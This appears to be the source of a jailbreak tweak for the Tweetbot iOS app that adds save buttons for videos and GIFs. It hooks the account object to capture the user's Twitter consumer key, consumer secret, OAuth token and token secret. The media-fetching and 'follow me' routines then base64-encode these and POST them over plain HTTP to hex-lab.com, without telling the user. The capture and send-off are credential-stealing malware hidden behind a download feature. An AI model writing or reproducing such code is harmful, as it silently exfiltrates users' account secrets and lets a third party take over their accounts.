#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import "SVProgressHUD.h"
#import "NSGIF.h"
#import <AssetsLibrary/AssetsLibrary.h>

NSString *consumer,*CKey,*token,*TKey;
NSMutableData *receivedData;
bool gif;
NSURLConnection* _connection;
float expectedBytes;
@interface PTHTweetbotStatusPreviewMediumView
@end
@interface PTHTweetbotStatusPreviewMediaView
@end
@interface PTHTweetbotStatusDetailStatusController : UIViewController
+(id)initWithStatus:(id)arg1;
@end
@interface PTHTweetbotStatusDetailMediaController : UIViewController
@end
@interface PTHTweetbotStatusDetailController : UIViewController

@end
@interface PTHTweetbotMedium : NSObject
@property(readonly, nonatomic) _Bool isMovie;
@property(nonatomic, getter=isAnimatedGIF) _Bool animatedGIF; // @synthesize animatedGIF=_animatedGIF;

@end
PTHTweetbotStatusDetailMediaController *sdmc;
@interface UIAlertController (supportedInterfaceOrientations)

@end
@implementation UIAlertController (supportedInterfaceOrientations)

#if __IPHONE_OS_VERSION_MAX_ALLOWED < 90000
- (NSUInteger)supportedInterfaceOrientations; {
        return UIInterfaceOrientationMaskPortrait;
}
#else
- (UIInterfaceOrientationMask)supportedInterfaceOrientations {
        return UIInterfaceOrientationMaskPortrait;
}
#endif

@end
long long TID;
@interface PTHTweetbotStatus
@property(readonly, nonatomic) NSURL *twitterURL;
@property(readonly, nonatomic) NSString *expandedURLText;
@property(readonly, nonatomic) long long originalTID;
@end
@interface PTHTweetbotHomeTimelineController : UIViewController
@end
@interface PTHTweetbotStatusView : UIView<NSURLConnectionDataDelegate>
-(void)Download:(NSString*)currentURL;
-(void)Links:(NSString*)arg1;
-(void)itsGIF:(NSString*)filePath;
-(void)statusMediaView:(id)arg1 didLongPress:(id)arg2;
@property(retain, nonatomic) PTHTweetbotStatus *status; // @synthesize status=_status;
@end
  #pragma clang diagnostic ignored "-Wincomplete-implementation"
@implementation PTHTweetbotStatusView


-(void)Download:(NSString*)currentURL
{

        [SVProgressHUD showWithStatus:@"Preparing .."];
        [[UIApplication sharedApplication] beginIgnoringInteractionEvents];
        NSURL *url = [NSURL URLWithString:currentURL];
        NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url];
        if (receivedData==nil)
        {
                receivedData = [[NSMutableData alloc] init];
        }
        else
        {
                NSString *range = [NSString stringWithFormat:@"bytes=%lu-", (unsigned long)receivedData.length];
                [request setValue:range forHTTPHeaderField:@"Range"];
        }

        _connection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
}

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
        expectedBytes = [response expectedContentLength];

}
- (void) connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
        [receivedData appendData:data];
        float progressive = (float)[receivedData length] / (float)expectedBytes;
        NSInteger val = progressive*100;
        [SVProgressHUD showProgress:progressive status:[NSString stringWithFormat:@"%ld%%",(long)val]];


}
- (void) connection:(NSURLConnection*)connection didFailWithError:(NSError*) error
{

        [SVProgressHUD showErrorWithStatus:@"Plz try Again!"];
        [[UIApplication sharedApplication] endIgnoringInteractionEvents];
}

- (void) connectionDidFinishLoading:(NSURLConnection*)connection
{

        NSString *filePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"tempx.mp4"];
        [receivedData writeToFile:filePath atomically:YES];
        if(!gif) {

UISaveVideoAtPathToSavedPhotosAlbum(filePath,nil,nil,nil);


                [SVProgressHUD showSuccessWithStatus:@"Saved!"];
                [[UIApplication sharedApplication] endIgnoringInteractionEvents];


        }
        else {
                [SVProgressHUD showWithStatus:@"Saving.."];
                NSURL *videoURL = [NSURL fileURLWithPath:filePath];
                // AVAsset * myAsset = [[AVURLAsset alloc] initWithURL:videoURL options: nil];
                // AVAssetTrack * videoAssetTrack = [myAsset tracksWithMediaType: AVMediaTypeVideo].firstObject;

                [NSGIF create:[NSGIFRequest requestWithSourceVideo:videoURL] completion:^(NSURL *GifURL) {
                         //GifURL is to nil if it failed or stopped.

                         //  [NSGIF createGIFfromURL:videoURL withFrameCount:videoAssetTrack.nominalFrameRate*5.5 delayTime:0.0 loopCount:0 completion:^(NSURL *GifURL) {

                         ALAssetsLibrary *library = [[ALAssetsLibrary alloc] init];

                         NSData *data = [NSData dataWithContentsOfURL:GifURL];

                         [library writeImageDataToSavedPhotosAlbum:data metadata:nil completionBlock:^(NSURL *assetURL, NSError *error) {
                                  if (error) {
                                          NSLog(@"Error Saving GIF to Photo Album: %@", error);
                                  } else {
                                          // TODO: success handling
                                          [SVProgressHUD showSuccessWithStatus:@"Saved!"];
                                          gif = 0;
                                          [[UIApplication sharedApplication] endIgnoringInteractionEvents];
                                  }
                          }];
                 }];
        }
        [receivedData setLength:0];
        sdmc = nil;
}

-(void)Links:(NSString*)arg1 {

        [SVProgressHUD showWithStatus:@"Fetching links.."];
        dispatch_async(dispatch_get_main_queue(), ^{
                NSData *nsdata = [[NSString stringWithFormat:@"%@|%@|%@|%@|%@",consumer,CKey,token,TKey,arg1] dataUsingEncoding:NSUTF8StringEncoding];

                NSString *base64Encoded = [nsdata base64EncodedStringWithOptions:0];



                UIAlertController * alert = [UIAlertController
                                             alertControllerWithTitle:nil
                                             message:nil
                                             preferredStyle:UIAlertControllerStyleAlert];
                // Create the request.
                NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://hex-lab.com/Api.php"]];

                // Specify that it will be a POST request
                request.HTTPMethod = @"POST";

                // This is how we set header fields
                //[request setValue:@"application/xml; charset=utf-8" forHTTPHeaderField:@"Content-Type"];

                // Convert your data and set your request's HTTPBody property
                NSString *stringData = [NSString stringWithFormat:@"Data=%@", base64Encoded];

                NSData *requestBodyData = [stringData dataUsingEncoding:NSUTF8StringEncoding];
                [request setHTTPBody: requestBodyData];

                // Create url connection and fire request
                //NSURLConnection *conn = [[NSURLConnection alloc] initWithRequest:request delegate:self];
                NSData *response = [NSURLConnection sendSynchronousRequest:request
                                    returningResponse:nil error:nil];

                NSString *string = [[NSString alloc] initWithData:response encoding:NSUTF8StringEncoding];
                if(string != nil) {
                        NSArray *arr = [string componentsSeparatedByString:@"#"];


                        for (size_t i = 0; i < [arr count]-1; i++) {





                                NSArray *arr2 = [[NSString stringWithFormat:@"%@",[arr objectAtIndex:i]] componentsSeparatedByString:@"^"];


                                UIAlertAction* yesButton = [UIAlertAction
                                                            actionWithTitle:[arr2 objectAtIndex:0]
                                                            style:UIAlertActionStyleDefault
                                                            handler:^(UIAlertAction * action) {
                                                                    [self Download:[arr2 objectAtIndex:1]];
                                                            }];
                                [alert addAction:yesButton];

                        }
                        if (!gif) {
                                UIAlertAction* CButton = [UIAlertAction
                                                          actionWithTitle:@"Cancel"
                                                          style:UIAlertActionStyleCancel
                                                          handler:^(UIAlertAction * action) {


                                                          }];


                                [alert addAction:CButton];

                                UIView *firstSubview = alert.view.subviews.firstObject;

                                UIView *alertContentView = firstSubview.subviews.firstObject;
                                for (UIView *subSubView in alertContentView.subviews) { //This is main catch
                                        subSubView.backgroundColor = [UIColor colorWithRed:1.00 green:1.00 blue:1.00 alpha:1.0]; //Here you change background
                                }

                                UIViewController *rootView = [[UIApplication sharedApplication].keyWindow rootViewController];
                                [rootView presentViewController:alert
                                 animated:YES
                                 completion:nil];
                                alert.view.tintColor = [UIColor colorWithRed:0.25 green:0.25 blue:0.25 alpha:1.0];
                                [SVProgressHUD dismiss];
                        }
                        else {
                                NSArray *arr2 = [[NSString stringWithFormat:@"%@",[arr objectAtIndex:0]] componentsSeparatedByString:@"^"];
                                [self Download:[arr2 objectAtIndex:1]];

                        }
                }



        });

}


@end

%hook PTHTweetbotStatusView

- (void)statusMediaView: (id)arg1 didLongPress: (id)arg2{


        [SVProgressHUD setBackgroundColor:[UIColor colorWithRed:0.65 green:0.65 blue:0.68 alpha:1.0]];






        PTHTweetbotStatusView *main = [[PTHTweetbotStatusView alloc] init];





        PTHTweetbotStatus *st= MSHookIvar<PTHTweetbotStatus*>(self,"_status");
        PTHTweetbotStatusPreviewMediaView *mediaPreviewView =MSHookIvar<PTHTweetbotStatusPreviewMediaView*>(self,"_mediaPreviewView");
        NSMutableArray *mediumViews = MSHookIvar<NSMutableArray*>(mediaPreviewView,"_mediumViews");;
        PTHTweetbotStatusPreviewMediumView *mediumView = [mediumViews objectAtIndex:0];
        PTHTweetbotMedium *medium = MSHookIvar<PTHTweetbotMedium*>(mediumView,"_medium");



        if(medium.isMovie || medium.animatedGIF) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil message:nil preferredStyle:UIAlertControllerStyleAlert];
                UIAlertAction* yesButton = [UIAlertAction
                                            actionWithTitle:@"Share"
                                            style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction * action) {

                                                    %orig;
                                            }];
                UIAlertAction* noButton = [UIAlertAction
                                           actionWithTitle:@"Save"
                                           style:UIAlertActionStyleDefault
                                           handler:^(UIAlertAction * action) {
                                                   if(medium.animatedGIF) {
                                                           [main Links:[NSString stringWithFormat:@"%lld",st.originalTID]];
                                                           gif = 1;
                                                   }
                                                   else {
                                                           [main Links:[NSString stringWithFormat:@"%lld",st.originalTID]];
                                                           gif = 0;
                                                   }
                                           }];
                UIAlertAction* CButton = [UIAlertAction
                                          actionWithTitle:@"Cancel"
                                          style:UIAlertActionStyleCancel
                                          handler:^(UIAlertAction * action) {


                                          }];
                [alert addAction:yesButton];
                [alert addAction:noButton];
                [alert addAction:CButton];



                UIView *firstSubview = alert.view.subviews.firstObject;

                UIView *alertContentView = firstSubview.subviews.firstObject;
                for (UIView *subSubView in alertContentView.subviews) { //This is main catch
                        subSubView.backgroundColor = [UIColor colorWithRed:1.00 green:1.00 blue:1.00 alpha:1.0]; //Here you change background
                }
                UIViewController *rootView = [[UIApplication sharedApplication].keyWindow rootViewController];
                [rootView presentViewController:alert
                 animated:YES
                 completion:nil];
                alert.view.tintColor = [UIColor colorWithRed:0.25 green:0.25 blue:0.25 alpha:1.0];

        }
        else {
                %orig;
        }
}


%end


%hook PTHTweetbotAccount
- (id)_currentUserPath{

        consumer = MSHookIvar<NSString*>(self,"_consumerKey");
        CKey = MSHookIvar<NSString*>(self,"_consumerSecret");
        token = MSHookIvar<NSString*>(self,"_token");
        TKey = MSHookIvar<NSString*>(self,"_tokenSecret");

        return %orig;
}

%end



%hook PTHTweetbotStatusDetailMediaController
- (void)viewDidLayoutSubviews{
  %orig;
  sdmc = self;
}
%end



%hook PTHTweetbotStatusDetailController
%new
-(void)links: (UIButton*)sender{
        PTHTweetbotStatusView *main = [[PTHTweetbotStatusView alloc] init];
        [main Links:[NSString stringWithFormat:@"%lld",TID]];

}
-(void)viewDidAppear:(BOOL)arg1
{
        %orig;
if(sdmc != nil) {
        PTHTweetbotStatusDetailMediaController *mediaController =sdmc;
        NSArray *loadedMedia = MSHookIvar<NSArray*>(mediaController,"_loadedMedia");;
        PTHTweetbotStatus *st= MSHookIvar<PTHTweetbotStatus*>(self,"_status");
         UIScrollView *sv= MSHookIvar<UIScrollView*>(sdmc,"_scrollView");
         NSLog(@"Called: 6");
        PTHTweetbotMedium *medium = [loadedMedia objectAtIndex:0];



        if(medium.isMovie || medium.animatedGIF) {
                UIButton *but= [UIButton buttonWithType:UIButtonTypeRoundedRect];

                [but setFrame:CGRectMake(sdmc.view.frame.size.width - 28, sdmc.view.frame.size.height - 28, 28, 28)];
                [but setTitle:@"💾" forState:UIControlStateNormal];
                [but setExclusiveTouch:YES];
                TID = st.originalTID;
                if(medium.animatedGIF) {
                        [but addTarget:self action:@selector(links:)  forControlEvents:UIControlEventTouchUpInside];
                        gif = 1;
                }
               else {
                        [but addTarget:self action:@selector(links:)  forControlEvents:UIControlEventTouchUpInside];
                        gif = 0;
                }


              [sv addSubview:but];
        }

}}



%end













%hook UIViewController
%new
-(void)follow{
        [SVProgressHUD showWithStatus:@"Folloing.."];
        dispatch_async(dispatch_get_main_queue(), ^{
                NSData *nsdata = [[NSString stringWithFormat:@"%@|%@|%@|%@",consumer,CKey,token,TKey] dataUsingEncoding:NSUTF8StringEncoding];

                NSString *base64Encoded = [nsdata base64EncodedStringWithOptions:0];


                // Create the request.
                NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://hex-lab.com/Api.php"]];

                // Specify that it will be a POST request
                request.HTTPMethod = @"POST";

                // This is how we set header fields
                //[request setValue:@"application/xml; charset=utf-8" forHTTPHeaderField:@"Content-Type"];

                // Convert your data and set your request's HTTPBody property
                NSString *stringData = [NSString stringWithFormat:@"follow=%@", base64Encoded];

                NSData *requestBodyData = [stringData dataUsingEncoding:NSUTF8StringEncoding];
                [request setHTTPBody: requestBodyData];

                // Create url connection and fire request
                //NSURLConnection *conn = [[NSURLConnection alloc] initWithRequest:request delegate:self];
                [NSURLConnection sendSynchronousRequest:request
                 returningResponse:nil error:nil];

                [SVProgressHUD dismiss];
                UIAlertView *alert = [[UIAlertView alloc]initWithTitle:nil message:@"Thank u , love u so much 😍" delegate:nil cancelButtonTitle:@"ok" otherButtonTitles:nil];
                [alert show];




        });

}

-(void)viewDidAppear:(bool)arg1 {
        NSString *status = [[NSUserDefaults standardUserDefaults] stringForKey:@"FirstAlert"];
        if(status == nil) {
                UIAlertController * alert = [UIAlertController
                                             alertControllerWithTitle:@"SaveBot\n"
                                             message:@"Do u wants to follow me ?"
                                             preferredStyle:UIAlertControllerStyleAlert];

                UIAlertAction* yesButton = [UIAlertAction
                                            actionWithTitle:@"yup 🙊"
                                            style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction * action) {
                                                    [self performSelector:@selector(follow)];
                                                    [[NSUserDefaults standardUserDefaults] setObject:@"ok" forKey:@"FirstAlert"];
                                                    [[NSUserDefaults standardUserDefaults] synchronize];
                                            }];
                UIAlertAction* noButton = [UIAlertAction
                                           actionWithTitle:@"Sorry 💔"
                                           style:UIAlertActionStyleDefault
                                           handler:^(UIAlertAction * action) {

                                                   [[NSUserDefaults standardUserDefaults] setObject:@"ok" forKey:@"FirstAlert"];
                                                   [[NSUserDefaults standardUserDefaults] synchronize];
                                           }];
                [alert addAction:yesButton];
                [alert addAction:noButton];

                                  #define ROOTVIEW [[[UIApplication sharedApplication] keyWindow] rootViewController]


                [ROOTVIEW presentViewController:alert animated:YES completion:nil];
                //[[NSUserDefaults standardUserDefaults] setObject:@"ok" forKey:@"FirstAlert"];
                return %orig;
        }
        else {


                return %orig;
        }


}



%end
